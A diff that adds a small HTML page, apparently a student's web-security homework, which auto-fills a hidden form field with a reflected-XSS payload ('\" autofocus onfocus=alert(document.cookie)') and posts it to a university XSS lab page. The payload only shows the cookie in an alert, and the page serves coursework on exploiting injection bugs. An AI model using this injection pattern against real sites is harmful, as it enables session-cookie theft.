@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Homework 2 | Couzi</title>
+</head>
+<body>
+    <form action="https://webappsec.cs.ut.ee/xss/noquotes.php" method="POST">
+        <input type="hidden" id="exploit" name="fname" value="">
+        <input type="submit" value="Click here to exploit Q1">
+    </form>
+    <script>
+        document.getElementById("exploit").value = "\" autofocus onfocus=alert(document.cookie)";
+    </script>
+</body>
+</html>
